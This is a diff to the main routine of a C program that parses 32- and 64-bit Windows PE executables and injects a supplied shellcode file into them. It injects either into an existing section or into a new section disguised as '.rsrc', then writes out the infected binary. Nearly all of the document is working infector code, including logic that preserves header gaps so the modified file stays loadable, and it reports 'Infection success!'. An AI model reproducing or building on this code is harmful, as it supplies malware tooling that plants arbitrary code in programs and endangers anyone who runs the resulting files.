@@ -25,9 +25,11 @@ static inf_method method = METHOD_CODE_INJECT;
 
 int main(int argc, char** argv) {
 	pe_dos_header dosHeader;
+	pe_nt_header ntHeader;
+	pe64_nt_header ntHeader64;
+	
 	FILE* f = NULL;
 	ach_mode mode = MODE_32BIT;
-	//inf_method method = METHOD_CODE_INJECT;
 	
 	ParseOptions(argc, argv);
 	
@@ -45,48 +47,40 @@ int main(int argc, char** argv) {
 		return -1;
 	}
 	
-	//read dos header
-	if (fread(&dosHeader, sizeof(pe_dos_header), 1, f) == 0) {
-		fprintf(stderr, "File %s too small (DOS header)\n", file_path);
-		fclose(f);
+	memset(&dosHeader, 0, sizeof(pe_dos_header));
+	memset(&ntHeader, 0, sizeof(pe_nt_header));
+	memset(&ntHeader64, 0, sizeof(pe64_nt_header));
+	
+	int err_parse = pe_parse(f, &dosHeader, &ntHeader, &ntHeader64);
+	//if (pe_parse(f, &dosHeader, &ntHeader, &ntHeader64)) {
+	if (err_parse) {
+		fprintf(stderr, "Bad PE file: %s err: %d\n", file_path, err_parse);
 		return -2;
 	}
 	
-	rewind(f);
-	
-	fprintf(stdout, "nt header offset is 0x%X\n", dosHeader.e_lfanew);
-	
-	//read nt header
-	pe_nt_header ntHeader;
-	pe64_nt_header ntHeader64;
-	
-	if (fseek(f, dosHeader.e_lfanew, SEEK_SET) < 0) {
-		fprintf(stderr, "File %s doesn't have nt header\n", file_path);
-		fclose(f);
-		return -3;
-	}
-	
-	if (fread(&ntHeader, sizeof(pe_nt_header), 1, f) == 0) {
-		fprintf(stderr, "File %s too small (NT header)\n", file_path);
-		fclose(f);
-		return -4;
-	}
-	
-	if (ntHeader.nt_optional_header.magic == IMAGE_NT_OPTIONAL_64_MAGIC) {
-		//it is 64bit binary
+	if (ntHeader64.nt_magic) { //if ntHeader64 filled
 		mode = MODE_64BIT;
-		
-		//reparse to another header
-		fseek(f, dosHeader.e_lfanew, SEEK_SET);
-		
-		if (fread(&ntHeader64, sizeof(pe64_nt_header), 1, f) == 0) {
-			fprintf(stderr, "File %s too small (NT64 header)\n", file_path);
-			fclose(f);
-			return -4;
-		}
 	}
 	
-	uint16_t sections_table_offset = 0;
+	list_pe_section_t sections = NULL;
+	char* dosOriginalGap = NULL; //bytes between end of dos header and PE signature
+	char* sectOriginalGap = NULL; //bytes between end of sections header and begin of first section
+	uint16_t dosOriginalGapSize = dosHeader.e_lfanew - sizeof(pe_dos_header);
+	uint16_t sectOriginalGapSize = 0;
+	uint16_t sectEndOffset = 0;
+	
+	if (dosOriginalGapSize) {
+		dosOriginalGap = (char*)malloc(dosOriginalGapSize);
+		
+		if (!dosOriginalGap) {
+			fprintf(stderr, "Internal error: can't allocate memory for DOS gap\n");
+			fclose(f);
+			return -3;
+		}
+		
+		fseek(f, sizeof(pe_dos_header), SEEK_SET);
+		fread(dosOriginalGap, dosOriginalGapSize, 1, f);
+	}
 	
 	switch (mode) {
 		case MODE_32BIT:
@@ -95,7 +89,9 @@ int main(int argc, char** argv) {
 			fprintf(stdout, "ImageBase: 0x%08X\n", ntHeader.nt_optional_header.image_base);
 			fprintf(stdout, "File alignment: 0x%08X\n", ntHeader.nt_optional_header.file_alignment);
 			
-			sections_table_offset = dosHeader.e_lfanew + ntHeader.nt_file_header.size_of_optional_header + sizeof(pe_file_header) + sizeof(uint32_t);
+			sections = pe_parse_sections(f, &dosHeader, &ntHeader);
+			sectEndOffset = dosHeader.e_lfanew + ntHeader.nt_file_header.size_of_optional_header + sizeof(pe_file_header) + sizeof(uint32_t) + 
+																		ntHeader.nt_file_header.number_of_sections * sizeof(pe_section_header);
 			break;
 		case MODE_64BIT:
 			fprintf(stdout, "That binary has 64bit arch\n");
@@ -103,52 +99,46 @@ int main(int argc, char** argv) {
 			fprintf(stdout, "ImageBase: 0x%016lX\n", ntHeader64.nt_optional_header.image_base);
 			fprintf(stdout, "File alignment: 0x%08X\n", ntHeader64.nt_optional_header.file_alignment);
 			
-			sections_table_offset = dosHeader.e_lfanew + ntHeader64.nt_file_header.size_of_optional_header + sizeof(pe_file_header) + sizeof(uint32_t);
+			sections = pe64_parse_sections(f, &dosHeader, &ntHeader64);
+			sectEndOffset = dosHeader.e_lfanew + ntHeader64.nt_file_header.size_of_optional_header + sizeof(pe_file_header) + sizeof(uint32_t) + 
+																		ntHeader64.nt_file_header.number_of_sections * sizeof(pe_section_header);
 			break;
 	}
 	
-	//parse table of section
-	rewind(f);
+	sectOriginalGapSize = sections->header.PointerToRawData - sectEndOffset;
 	
-	if (fseek(f, sections_table_offset, SEEK_SET) < 0) {
-		fprintf(stderr, "File %s doesn't have section table\n", file_path);
-		fclose(f);
-		return -5;
+	if (sectOriginalGapSize) {
+		sectOriginalGap = (char*)malloc(sectOriginalGapSize);
+		
+		if (!sectOriginalGap) {
+			fprintf(stderr, "Internal error: can't allocate memory for section gap\n");
+			fclose(f);
+			return -4;
+		}
+		
+		fseek(f, sectEndOffset, SEEK_SET);
+		fread(sectOriginalGap, sectOriginalGapSize, 1, f);
 	}
 	
 	if (show_sections_flag) {
-		switch (mode) {
-			case MODE_32BIT:
-				for (uint16_t i = 0; i < ntHeader.nt_file_header.number_of_sections; i++) {
-					pe_section_header sectionHeader;
-					
-					if (fread(&sectionHeader, sizeof(pe_section_header), 1, f) == 0) {
-						fprintf(stderr, "File %s too small (Can't read section number %d)\n", file_path, i);
-						fclose(f);
-						return -6;
-					}
-					
-					pe_print_section_header(&sectionHeader);
-					fprintf(stdout, "\n");
-				}
-				
-				break;
-			case MODE_64BIT:
-				for (uint16_t i = 0; i < ntHeader64.nt_file_header.number_of_sections; i++) {
-					pe_section_header sectionHeader;
-					
-					if (fread(&sectionHeader, sizeof(pe_section_header), 1, f) == 0) {
-						fprintf(stderr, "File %s too small (Can't read section number %d)\n", file_path, i);
-						fclose(f);
-						return -6;
-					}
-					
-					pe_print_section_header(&sectionHeader);
-					fprintf(stdout, "\n");
-				}
-			
-				break;
+		list_pe_section_t curSect = sections;
+		
+		while (curSect) {
+			pe_print_section_header(&curSect->header);
+			fprintf(stdout, "\n");
+			curSect = curSect->next;
 		}
+		
+		fprintf(stdout, "\n");
+	}
+	
+	//write
+	FILE* out_f = fopen(output_file_path, "wb");
+	
+	if (!out_f) {
+		fprintf(stderr, "Can't open file for output: %s\n", output_file_path);
+		fclose(f);
+		return -5;
 	}
 	
 	FILE* sf = fopen(shellcode_file_path, "rb");
@@ -156,58 +146,74 @@ int main(int argc, char** argv) {
 	if (!sf) {
 		fprintf(stderr, "Can't open shellcode file: %s\n", shellcode_file_path);
 		fclose(f);
-		return -7;
-	}
-	
-	FILE* out_f = fopen(output_file_path, "wb+");
-	
-	if (!out_f) {
-		fprintf(stderr, "Can't open file for output: %s\n", output_file_path);
-		fclose(f);
-		fclose(sf);
-		return -8;
+		return -6;
 	}
 	
 	//obtain shellcode file size
 	fseek(sf, 0, SEEK_END);
-	uint32_t size = ftell(sf);
+	uint32_t xcode_size = ftell(sf);
 	rewind(sf);
 	
-	fprintf(stdout, "size of shellcode: %u\n", size);
+	fprintf(stdout, "size of shellcode: %u\n", xcode_size);
 	
-	unsigned char* xcode = (unsigned char*)malloc(size);
+	unsigned char* xcode = (unsigned char*)malloc(xcode_size);
 	
 	if (!xcode) {
 		fprintf(stderr, "Can't allocate memory for shellcode\n");
 		fclose(f);
+		fclose(out_f);
 		fclose(sf);
-		return -9;
+		return -7;
 	}
 	
-	fread(xcode, size, 1, sf);
+	fread(xcode, xcode_size, 1, sf);
+	fclose(sf);
 	
 	int err = 0;
 	switch (mode) {
 		case MODE_32BIT:
-			//err = pe_infect_section(f, out_f, &dosHeader, &ntHeader, xcode, size);
-			//err = pe_infect_new_section(f, out_f, &dosHeader, &ntHeader, xcode, size, ".code");
 			switch (method) {
 				case METHOD_CODE_INJECT:
-					err = pe_infect_section(f, out_f, &dosHeader, &ntHeader, xcode, size);
+					err = pe_infect_section(&dosHeader, &ntHeader, sections, xcode, xcode_size);
 					break;
 				case METHOD_CODE_NEWSECT:
-					err = pe_infect_new_section(f, out_f, &dosHeader, &ntHeader, xcode, size, ".rsrc");
+					if (sectOriginalGapSize <= sizeof(pe_section_header)) {
+						fprintf(stderr, "Not enough space in section header for new section record\n");
+						err = -10;
+					} else {
+						err = pe_infect_new_section(&dosHeader, &ntHeader, sections, xcode, xcode_size, ".rsrc");
+						if (!err) {
+							sectOriginalGapSize -= sizeof(pe_section_header); //decrease section gap
+						}
+					}
 					break;
+			}
+			
+			if (!err) {
+				err = pe_write(out_f, &dosHeader, &ntHeader, sections, dosOriginalGap, dosOriginalGapSize, sectOriginalGap, sectOriginalGapSize);
 			}
 			break;
 		case MODE_64BIT:
+			//err = pe64_infect_section(&dosHeader, &ntHeader64, sections, xcode, xcode_size);
 			switch (method) {
 				case METHOD_CODE_INJECT:
-					err = pe64_infect_section(f, out_f, &dosHeader, &ntHeader64, xcode, size);
+					err = pe64_infect_section(&dosHeader, &ntHeader64, sections, xcode, xcode_size);
 					break;
 				case METHOD_CODE_NEWSECT:
-					err = pe64_infect_new_section(f, out_f, &dosHeader, &ntHeader64, xcode, size, ".rsrc");
+					if (sectOriginalGapSize <= sizeof(pe_section_header)) {
+						fprintf(stderr, "Not enough space in section header for new section record\n");
+						err = -10;
+					} else {
+						err = pe64_infect_new_section(&dosHeader, &ntHeader64, sections, xcode, xcode_size, ".rsrc");
+						if (!err) {
+							sectOriginalGapSize -= sizeof(pe_section_header); //decrease section gap
+						}
+					}
 					break;
+			}
+			
+			if (!err) {
+				err = pe64_write(out_f, &dosHeader, &ntHeader64, sections, dosOriginalGap, dosOriginalGapSize, sectOriginalGap, sectOriginalGapSize);
 			}
 			break;
 	}
@@ -216,11 +222,14 @@ int main(int argc, char** argv) {
 		fprintf(stdout, "Infection success!\n");
 	} else {
 		fprintf(stderr, "Infection error %d\n", err);
-	}
+		fclose(f);
+		fclose(out_f);
+		
+		return -8;
+	}	
 	
 	fclose(f);
 	fclose(out_f);
-	
 	return 0;
 }
 
@@ -239,7 +248,6 @@ static void ParseOptions(int argc, char** argv) {
 	
 	int res;
 	int option_index;
-	char tmp[MAX_STRING] = "";
 	
 	while (( res = getopt_long(argc, argv, short_options, 
 		long_options, &option_index)) != -1) {
